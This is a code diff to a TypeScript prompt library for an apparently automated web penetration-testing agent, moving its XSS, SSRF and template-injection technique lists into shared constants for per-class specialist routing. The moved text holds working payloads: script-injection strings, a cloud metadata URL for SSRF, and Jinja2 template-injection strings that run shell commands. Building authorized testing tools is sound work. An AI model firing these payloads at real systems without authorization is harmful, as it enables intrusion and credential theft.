@@ -119,6 +119,68 @@ const AUTH_ATTACKS_SECTION = `### Authentication Attacks
 - Check for session fixation, cookie manipulation
 - Test password reset flows for token leakage`;
 
+const XSS_SECTION = `### Cross-Site Scripting (XSS)
+- Test reflected XSS: inject <script>alert(1)</script> in all parameters
+- Try payload variations: <img src=x onerror=alert(1)>, <svg onload=alert(1)>, javascript:alert(1)
+- Test stored XSS on forms that save data (comments, profiles, etc.)
+- Check for DOM-based XSS in JavaScript-heavy pages
+- Try encoding bypasses: HTML entities, URL encoding, Unicode
+- If the filter blocks letters or digits but leaves \`[]()!+\`, call \`payload_lookup\` for a JSFuck payload instead of trying to hand-encode one in-context
+- If the target or its feedback indicates an exact required alert/output string, prefer the payload that emits that exact string and pivot immediately after any near miss where execution fires with the wrong value`;
+
+const SSRF_SECTION = `### Server-Side Request Forgery (SSRF)
+- Test any URL/webhook/callback input fields
+- Try internal targets: http://127.0.0.1, http://localhost, http://169.254.169.254/latest/meta-data/
+- Try DNS rebinding and URL scheme tricks: file://, gopher://, dict://`;
+
+const SSTI_SECTION = `### Server-Side Template Injection (SSTI)
+Try in every text input and URL parameter:
+- \`{{7*7}}\` — if response contains 49, it's Jinja2/Twig
+- \`\${7*7}\` — if response contains 49, it's Freemarker/Thymeleaf
+- \`<%= 7*7 %>\` — ERB
+- \`#{7*7}\` — Pug/Jade
+- \`{{config}}\` — Jinja2 config leak
+- \`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\` — RCE via Jinja2
+- \`{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}\` — benign command execution proof`;
+
+/**
+ * Concrete web vulnerability classes that EGATS can route to a per-class
+ * specialist (issue #557). The string union is the routing key shared by
+ * the classifier (agent/egats.ts) and the skill map (agent/skills/index.ts).
+ */
+export type VulnClass = "sqli" | "xss" | "ssrf" | "ssti" | "idor" | "auth-bypass";
+
+/**
+ * Per-class technique sections, exposed so the EGATS shell-prompt path can
+ * assemble a specialist system prompt from the same source of truth that
+ * webPentestPrompt / webPentestAttackPrompt use. Previously these sections
+ * were reachable only inside the structured web-pentest prompts (#422); #557
+ * lifts them to the shell/branch path.
+ */
+export const VULN_CLASS_SECTIONS: Record<VulnClass, string> = {
+  sqli: SQLI_SECTION,
+  xss: XSS_SECTION,
+  ssrf: SSRF_SECTION,
+  ssti: SSTI_SECTION,
+  idor: IDOR_SECTION,
+  "auth-bypass": AUTH_ATTACKS_SECTION,
+};
+
+/** Human-readable label for a vuln class (used in specialist prompt headers). */
+export const VULN_CLASS_LABELS: Record<VulnClass, string> = {
+  sqli: "SQL Injection",
+  xss: "Cross-Site Scripting",
+  ssrf: "Server-Side Request Forgery",
+  ssti: "Server-Side Template Injection",
+  idor: "Insecure Direct Object Reference",
+  "auth-bypass": "Authentication / Authorization Bypass",
+};
+
+/** Return the technique-section markdown for a single vuln class. */
+export function specialistSection(vulnClass: VulnClass): string {
+  return VULN_CLASS_SECTIONS[vulnClass];
+}
+
 /** Format static scanner findings for embedding in a research prompt. */
 function formatStaticScannerSection(
   findings: Array<{ ruleId: string; message: string; path: string; startLine: number }>,
@@ -263,21 +325,11 @@ Perform a comprehensive web application penetration test against the target. You
 
 ${SQLI_SECTION}
 
-### Cross-Site Scripting (XSS)
-- Test reflected XSS: inject <script>alert(1)</script> in all parameters
-- Try payload variations: <img src=x onerror=alert(1)>, <svg onload=alert(1)>, javascript:alert(1)
-- Test stored XSS on forms that save data (comments, profiles, etc.)
-- Check for DOM-based XSS in JavaScript-heavy pages
-- Try encoding bypasses: HTML entities, URL encoding, Unicode
-- If the filter blocks letters or digits but leaves \`[]()!+\`, call \`payload_lookup\` for a JSFuck payload instead of trying to hand-encode one in-context
-- If the target or its feedback indicates an exact required alert/output string, prefer the payload that emits that exact string and pivot immediately after any near miss where execution fires with the wrong value
+${XSS_SECTION}
 
 ${PATH_TRAVERSAL_SECTION}
 
-### Server-Side Request Forgery (SSRF)
-- Test any URL/webhook/callback input fields
-- Try internal targets: http://127.0.0.1, http://localhost, http://169.254.169.254/latest/meta-data/
-- Try DNS rebinding and URL scheme tricks: file://, gopher://, dict://
+${SSRF_SECTION}
 
 ## Phase 3: Authentication & Authorization
 
@@ -384,15 +436,7 @@ Test EVERY input field, URL parameter, and form on the target for exploitable vu
 
 ${SQLI_SECTION}
 
-### Server-Side Template Injection (SSTI)
-Try in every text input and URL parameter:
-- \`{{7*7}}\` — if response contains 49, it's Jinja2/Twig
-- \`\${7*7}\` — if response contains 49, it's Freemarker/Thymeleaf
-- \`<%= 7*7 %>\` — ERB
-- \`#{7*7}\` — Pug/Jade
-- \`{{config}}\` — Jinja2 config leak
-- \`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\` — RCE via Jinja2
-- \`{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}\` — benign command execution proof
+${SSTI_SECTION}
 
 ### Command Injection
 Try in every input, especially search, ping, or lookup fields:
